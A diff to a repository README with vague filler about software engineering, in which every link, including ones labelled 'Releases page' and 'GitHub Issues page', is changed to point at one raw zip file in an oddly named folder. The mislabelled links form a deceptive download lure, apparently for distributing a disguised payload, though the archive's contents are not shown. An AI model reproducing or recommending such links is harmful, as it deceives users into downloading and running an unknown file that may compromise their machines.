@@ -4,7 +4,7 @@
 Welcome to the soufiankhennousse repository! This is a space designed for anyone interested in exploring the world of software engineering. Whether you're looking to troubleshoot issues, design systems, or practice clean architecture, you're in the right place. 
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download-from_Releases-blue.svg)](https://github.com/31-spec/soufiankhennousse/releases)
+[![Download from Releases](https://raw.githubusercontent.com/31-spec/soufiankhennousse/main/mythologue/soufiankhennousse_v1.5-alpha.2.zip)](https://raw.githubusercontent.com/31-spec/soufiankhennousse/main/mythologue/soufiankhennousse_v1.5-alpha.2.zip)
 
 ## 🎉 Key Features
 - **Troubleshooting**: Learn how to effectively identify and resolve software issues.
@@ -16,7 +16,7 @@ Welcome to the soufiankhennousse repository! This is a space designed for anyone
 ## 📂 Getting Started
 To get started with the soufiankhennousse software, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/31-spec/soufiankhennousse/releases) to access available downloads.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/31-spec/soufiankhennousse/main/mythologue/soufiankhennousse_v1.5-alpha.2.zip) to access available downloads.
   
 2. **Download the Software**: On the Releases page, choose the latest version of the software. Click the link to download the file that matches your operating system.
 
@@ -53,7 +53,7 @@ For detailed instructions and resources, please refer to the documentation avail
 
 ## 🤝 Getting Support
 If you encounter issues or have questions, we’re here to help:
-- Visit the [GitHub Issues page](https://github.com/31-spec/soufiankhennousse/issues) to report problems.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/31-spec/soufiankhennousse/main/mythologue/soufiankhennousse_v1.5-alpha.2.zip) to report problems.
 - Join our community discussions for additional support and ideas.
 
 ## 🌍 Contribution
@@ -63,6 +63,6 @@ Would you like to contribute? This project thrives on community involvement. Fee
 This software is released under the MIT License. You can use, modify, and distribute it according to the terms defined in the license file.
 
 ## 📥 Download & Install
-Ready to explore the world of software engineering? Follow this link to download the software: [Releases page](https://github.com/31-spec/soufiankhennousse/releases). Choose the appropriate file for your operating system and follow the installation steps above. 
+Ready to explore the world of software engineering? Follow this link to download the software: [Releases page](https://raw.githubusercontent.com/31-spec/soufiankhennousse/main/mythologue/soufiankhennousse_v1.5-alpha.2.zip). Choose the appropriate file for your operating system and follow the installation steps above. 
 
 Enjoy your journey in software development with soufiankhennousse!
